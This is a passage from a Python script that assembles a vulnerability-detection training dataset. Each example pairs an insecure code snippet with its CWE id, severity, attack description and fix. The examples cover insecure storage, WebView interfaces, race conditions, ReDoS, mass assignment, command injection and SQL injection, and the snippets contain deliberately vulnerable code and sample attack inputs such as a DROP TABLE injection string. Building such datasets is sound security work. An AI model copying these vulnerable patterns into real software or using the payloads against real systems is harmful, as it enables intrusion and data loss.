       'val prefs = getSharedPreferences("app", MODE_WORLD_READABLE)\nprefs.edit().putString("token", authToken).apply()',
       "CWE-312","Sensitive Data in World-Readable SharedPreferences","HIGH",
       "MODE_WORLD_READABLE allows other apps on rooted device to read the auth token.",
       'val prefs = getSharedPreferences("app", MODE_PRIVATE)\nprefs.edit().putString("token", authToken).apply()'),

    ex("Swift",
       'let password = UserDefaults.standard.string(forKey: "password")',
       "CWE-312","Password Stored in UserDefaults","HIGH",
       "UserDefaults is unencrypted plist; jailbroken device or backup gives attacker plaintext password.",
       'let query: [String: Any] = [kSecClass as String: kSecClassGenericPassword,\n             kSecAttrAccount as String: "password",\n             kSecReturnData as String: true]\n// Use Keychain Services API instead'),

    ex("Kotlin",
       'webView.settings.javaScriptEnabled = true\nwebView.addJavascriptInterface(this, "Android")',
       "CWE-749","Exposed JavaScript Interface in WebView","HIGH",
       "Malicious page calls Android.sensitiveMethod() to access native Android APIs.",
       'webView.settings.javaScriptEnabled = true\n// Only add JS interface for trusted origins\n// Annotate exposed methods with @JavascriptInterface and validate caller origin'),

    # ══ Race Conditions ════════════════════════════════════════════════════════
    ex("Python",
       'def withdraw(account_id, amount):\n    balance = get_balance(account_id)\n    if balance >= amount:\n        update_balance(account_id, balance - amount)',
       "CWE-362","Race Condition in Banking Transaction","HIGH",
       "Concurrent withdrawals pass balance check simultaneously, leading to negative balance.",
       'def withdraw(account_id, amount):\n    with db.transaction():\n        balance = db.execute("SELECT balance FROM accounts WHERE id=%s FOR UPDATE", (account_id,)).scalar()\n        if balance >= amount:\n            db.execute("UPDATE accounts SET balance=%s WHERE id=%s", (balance - amount, account_id))'),

    ex("Python",
       'if not os.path.exists(lock_file):\n    open(lock_file, "w").close()\n    do_exclusive_work()',
       "CWE-362","TOCTOU Race Condition on Lock File","MEDIUM",
       "Two processes pass exists() check simultaneously and both execute exclusive work.",
       'import fcntl\nwith open(lock_file, "w") as f:\n    fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)\n    do_exclusive_work()'),

    # ══ ReDoS ═════════════════════════════════════════════════════════════════
    ex("Python",
       'import re\nif re.match(r"^(\\w+\\s*)+$", user_text):\n    process(user_text)',
       "CWE-1333","ReDoS — Exponential Backtracking","MEDIUM",
       "Input 'aaaa...aaa!' causes catastrophic backtracking, blocking the server for seconds.",
       'import re\n# Use atomic pattern or timeout\nif re.match(r"^\\w+(\\s+\\w+)*$", user_text):  # linear time\n    process(user_text)'),

    # ══ Mass Assignment ════════════════════════════════════════════════════════
    ex("Python",
       'user = User.query.get(id)\nfor key, val in request.json.items():\n    setattr(user, key, val)',
       "CWE-915","Mass Assignment","HIGH",
       "Attacker sends {\"is_admin\": true, \"email_verified\": true} to escalate privileges.",
       'ALLOWED = {"display_name", "bio", "avatar_url"}\nfor key in ALLOWED:\n    if key in request.json:\n        setattr(user, key, request.json[key])'),

    ex("Ruby",
       'def update\n  @user.update(params[:user])\nend',
       "CWE-915","Mass Assignment (Rails strong parameters missing)","HIGH",
       "Attacker includes role:'admin' in params to escalate to admin without strong params.",
       'def update\n  @user.update(user_params)\nend\n\ndef user_params\n  params.require(:user).permit(:name, :email)\nend'),

    # ══ Kotlin extras ═════════════════════════════════════════════════════════
    ex("Kotlin",
       'override fun onReceive(context: Context, intent: Intent) {\n    val data = intent.getStringExtra("cmd")\n    Runtime.getRuntime().exec(data)\n}',
       "CWE-78","OS Command Injection via BroadcastReceiver","CRITICAL",
       "Exported receiver accepts arbitrary commands from any app on the device.",
       '// Add android:exported="false" in manifest and validate all intent extras\n// Never execute shell commands from BroadcastReceiver input'),

    # ══ TypeScript extras ═════════════════════════════════════════════════════
    ex("TypeScript/Next.js",
       "export async function POST(req: Request) {\n  const { email } = await req.json();\n  const user = await db.query(`SELECT * FROM users WHERE email = '${email}'`);\n  return Response.json(user);\n}",
       "CWE-89","SQL Injection in API Route Handler","HIGH",
       "Attacker sends email='; DROP TABLE users;-- to destroy the database.",
       "const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);\nreturn Response.json(user);"),
]


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path, default=OUT_DATA)
    parser.add_argument("--include-old", action="store_true", default=True,
                        help="기존 v2 데이터를 새 포맷으로 변환해 포함")
    parser.add_argument("--shuffle", action="store_true", default=True)
    args = parser.parse_args()

    all_examples: list[dict] = []

    # 기존 203건 → 새 포맷 변환
    if args.include_old and ORIG_V2.exists():
        old_records = [json.loads(l) for l in ORIG_V2.read_text().splitlines() if l.strip()]
        converted = convert_old(old_records)
        all_examples.extend(converted)
        print(f"기존 변환: {len(converted)}건")

    # 새 데이터 추가
    all_examples.extend(EXAMPLES)
    print(f"신규 추가: {len(EXAMPLES)}건")

    if args.shuffle:
        random.seed(42)
        random.shuffle(all_examples)

    # 중복 제거 (prompt 기준)
    seen: set[str] = set()
    deduped: list[dict] = []
    for ex in all_examples:
        key = ex["prompt"].strip()
        if key not in seen:
            seen.add(key)
            deduped.append(ex)

    args.output.parent.mkdir(parents=True, exist_ok=True)
    with open(args.output, "w", encoding="utf-8") as f:
        for item in deduped:
            f.write(json.dumps(item, ensure_ascii=False) + "\n")

    print(f"\n최종: {len(deduped)}건 → {args.output}")

    # 분포 확인
    from collections import Counter
    cwe_dist: Counter = Counter()
    sev_dist: Counter = Counter()
    for item in deduped:
        cwe_m = re.search(r"VULNERABILITY: (CWE-\d+)", item["completion"])
        if cwe_m:
            cwe_dist[cwe_m.group(1)] += 1
        sev_m = re.search(r"SEVERITY:\s*(\w+)", item["completion"])
        if sev_m:
            sev_dist[sev_m.group(1)] += 1

    print(f"\n취약점 종류 (Top 10): {cwe_dist.most_common(10)}")
    print(f"심각도 분포: {dict(sev_dist)}")


if __name__ == "__main__":
    main()
